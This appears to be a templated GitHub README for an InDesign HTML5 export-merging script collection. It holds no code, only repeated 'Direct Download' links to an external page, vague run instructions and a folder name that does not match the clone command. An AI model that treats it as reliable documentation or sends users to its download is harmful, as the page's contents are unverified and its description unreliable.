# InDesign HTML5 Merging and Optimisation Workflow v2026 - Script Collection 2026

> A purpose-built script set for Adobe InDesign export pipelines, designed to combine HTML output, bundle external assets, and simplify delivery as a single file for publication or archive use.

[![Scripts](https://img.shields.io/badge/Scripts-Collection-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Adobe%20InDesign%20export%20workflow-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/danielprice1995/indesign-html5-merge-utility?style=flat-square)](https://github.com/danielprice1995/indesign-html5-merge-utility)

---

<p align="center">
  <a href="https://danielprice1995.github.io/indesign-html5-merge-utility/">
    <img src="https://img.shields.io/badge/Download-InDesign%20HTML5%20Merging%20and%20Optimisation%20Workflow%20Scripts-brightgreen?style=for-the-badge" alt="Download InDesign HTML5 Merging and Optimisation Workflow Scripts">
  </a>
</p>

> **[Direct Download - InDesign HTML5 Merging and Optimisation Workflow](https://danielprice1995.github.io/indesign-html5-merge-utility/)**

---

[Download Latest Build](https://danielprice1995.github.io/indesign-html5-merge-utility/)

---

## What This Collection Does

This repository targets workflows that start with HTML exported from Adobe InDesign and reshape that output into a cleaner web package. It is intended for cases where several export files need to be folded into one scrollable document, kept in a clear structure, and made easier to publish as one deliverable.

The emphasis here is consolidation and optimisation, not visual redesign. The scripts can inline outside resources into a single HTML file, work with base64-encoded media, and produce output that is simpler to save, distribute, or archive. Optional image reduction is also part of the workflow, including PNG-to-JPEG conversion when suitable, while keeping layout, styling, navigation, and smooth scrolling intact.

---

## Script Areas Included

- HTML merge workflow for joining multiple InDesign export files into one document
- Asset embedding tools for packaging external resources into a self-contained HTML bundle
- Base64 media optimisation for encoded images and audio
- Image conversion helpers for optional PNG to JPEG reduction
- Navigation and scroll behavior utilities for a smoother long-form reading experience
- Single-directory workflow support for straightforward export sets
- Multi-collection handling for grouped or batched publication sets
- Archival preparation steps for storing or sharing compact monolithic output

---

## Getting Started

1. Download or clone the repository:
   - `git clone https://github.com/danielprice1995/indesign-html5-merge-utility.git
2. Open the project folder:
   - `cd indesign-html-merge`
3. Put your InDesign-exported HTML files into the expected input folder or working directory.
4. Run the workflow script(s) according to your local setup.
5. Check the merged HTML output, then move completed files to the location you use for publishing or archiving.

Example organization:

- `scripts/` for merge and optimisation routines
- `configs/` for paths, conversion choices, and output settings
- `examples/` for sample input layouts or test exports
- `docs/` for usage notes and workflow guidance

---

## Compatibility

| Area | Support |
| --- | --- |
| Source content | Adobe InDesign HTML export output |
| Output style | Single-file HTML publication |
| Workflow mode | Single-directory and multi-collection setups |
| Media handling | Base64 images and audio |
| Conversion tooling | Python-based scripts, with FFmpeg referenced for media-related processing |
| Image optimisation | Optional PNG to JPEG conversion |

---

## Project Structure

- `scripts/` - main workflow scripts for merging and optimisation
- `configs/` - settings for inputs, outputs, and processing options
- `examples/` - sample structures for trying the workflow
- `docs/` - supporting notes and reference material
- `assets/` - local resources used by the collection
- `output/` - generated merged or optimised files

---

## FAQ

**How often is it updated?**  
Release cadence follows changes in the workflow, formatting refinements, and optimisation needs for InDesign export output.

**Can I adjust the behavior?**  
Yes. The collection is organized around scripts and configuration-based workflow choices, so you can tune input paths, output structure, and conversion settings to fit your publication setup.

**Does it work with every export?**  
It is intended for Adobe InDesign HTML export workflows, especially situations where several files need to be combined into one scrollable document or packaged for archival storage.

**Where are the generated files stored?**  
That depends on your local setup. The workflow is built to work with orderly output folders so merged HTML and related assets can stay together.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
